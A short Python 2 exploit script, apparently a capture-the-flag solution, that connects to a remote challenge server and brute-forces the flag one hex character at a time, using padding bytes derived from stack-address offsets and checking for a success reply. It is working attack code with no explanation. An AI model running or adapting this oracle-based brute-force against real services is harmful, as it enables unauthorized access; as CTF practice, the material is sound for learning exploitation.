from zio import *
from struct import pack


io = zio(("pwn.phrack.top", 9878), print_read=COLORED(RAW), print_write=COLORED(RAW, 'green'))

def is_valid(gao):
    io.read_until('guess> ')
    io.write(gao)
    io.write('\n') # return!
    gao = io.readline()
    return gao.startswith('Yaaaay!')

diff = 0x7fffffffcd00 - 0x7fffffffccc0
#flag = '504354467b' # PCTF{
#flag = '46414b457b' # FAKE{
flag = '504354467B34396434333130613130383538373535363739333236353165353539653135336366' # ...
padding = ''.join('0' + pack('<b', -diff + i) for i in xrange(len(flag) / 2, 50))
while padding:
    print flag.decode('hex')
    padding = padding[2:]
    for c in '0123456789abcdef}':
        c = c.encode('hex')
        if is_valid(flag + c + padding):
            flag += c
            break
    else:
        print "...Boom!"
        sys.exit(1)
print flag.decode('hex')
